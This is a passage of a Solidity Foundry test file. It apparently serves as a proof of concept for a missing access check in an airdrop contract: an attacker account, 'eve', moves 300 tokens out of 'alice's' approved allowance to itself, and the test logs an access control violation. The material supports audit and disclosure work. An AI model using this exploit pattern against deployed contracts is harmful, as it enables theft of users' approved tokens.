    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(balanceOf[from] >= amount, "Insufficient balance");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

contract AirDropTest is Test {
    airDrop public airdrop;
    MockERC20 public token;

    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address eve = makeAddr("eve");

    function setUp() public {
        vm.startPrank(deployer);
        airdrop = new airDrop();
        token = new MockERC20(18);
        vm.stopPrank();

        token.mint(alice, 1000 ether);
        vm.prank(alice);
        token.approve(address(airdrop), 500 ether);
    }

    function testUnauthorizedTokenTransfer() public {
        // Pre-state checks
        assertEq(token.balanceOf(alice), 1000 ether, "Initial Alice balance incorrect");
        assertEq(token.balanceOf(eve), 0, "Initial Eve balance should be 0");

        // Generate transfer parameters
        address[] memory recipients = new address[](1);
        recipients[0] = eve;

        // Eve initiates transfer from Alice's address
        vm.prank(eve);
        airdrop.transfer(
            alice,                   // from
            address(token),          // token address
            recipients,              // recipient addresses
            300,                     // token amount (in whole tokens)
            token.decimals()         // token decimals
        );

        // Post-state checks
        assertEq(token.balanceOf(alice), 700 ether, "Tokens not taken from Alice");
        assertEq(token.balanceOf(eve), 300 ether, "Eve didn't receive tokens");
        assertEq(token.allowance(alice, address(airdrop)), 200 ether, "Allowance not updated");

        console.log("Access control violation: Eve successfully transferred from Alice's account");
    }
}
